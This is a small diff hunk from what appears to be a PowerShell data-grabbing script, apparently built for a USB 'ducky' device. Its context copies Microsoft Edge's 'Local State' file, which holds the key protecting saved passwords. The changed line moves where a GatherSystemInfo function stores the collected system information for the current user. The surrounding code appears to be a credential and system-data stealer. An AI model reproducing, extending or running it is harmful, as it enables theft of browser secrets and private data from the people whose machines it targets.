@@ -61,7 +61,7 @@ Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destin
 
 # Gather additional system information
 function GatherSystemInfo {
-    $sysInfoDir = "$duckletter\$env:USERNAME\SystemInfo"
+    $sysInfoDir = "$duckletter\Cache\$env:USERNAME\SystemInfo"
     if (-Not (Test-Path $sysInfoDir)) {
         New-Item -ItemType Directory -Path $sysInfoDir
     }
